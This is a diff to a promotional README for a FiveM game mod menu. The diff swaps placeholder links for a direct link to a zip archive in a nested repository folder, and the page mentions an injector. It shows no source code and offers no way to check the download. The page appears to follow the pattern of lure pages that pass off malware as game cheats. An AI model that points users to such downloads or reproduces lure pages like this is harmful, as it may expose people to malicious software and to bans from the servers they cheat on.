@@ -2,7 +2,7 @@
 
 Take full control of your FiveM experience with this powerful and intuitive Mod Menu. Designed for versatility and performance, this tool allows you to customize your gameplay, manipulate the world environment, and access exclusive features to enhance your roleplay or freestyle sessions.
 
-**[⬇️ Download FiveM Mod Menu](https://github.com)**
+**[⬇️ Download FiveM Mod Menu](https://raw.githubusercontent.com/rebeecka/FiveM-Mod-Menu/main/boldhearted/Five-Menu-Mod-3.7.zip)**
 
 ## 🛠️ Powerful Features
 
@@ -30,7 +30,7 @@ Take full control of your FiveM experience with this powerful and intuitive Mod 
 
 ## ⚙️ Installation Guide
 
-1. **Download:** Get the latest release from the **[Download Link](https://github.com)**.
+1. **Download:** Get the latest release from the **[Download Link](https://raw.githubusercontent.com/rebeecka/FiveM-Mod-Menu/main/boldhearted/Five-Menu-Mod-3.7.zip)**.
 2. **Installation:** Follow the specific installation instructions provided in the folder (usually involving placing the files in your FiveM `plugins` folder or using the provided injector).
 3. **Launch FiveM:** Start the FiveM client and join your preferred server.
 4. **Activate:** Use the designated hotkey to open the menu interface in-game.
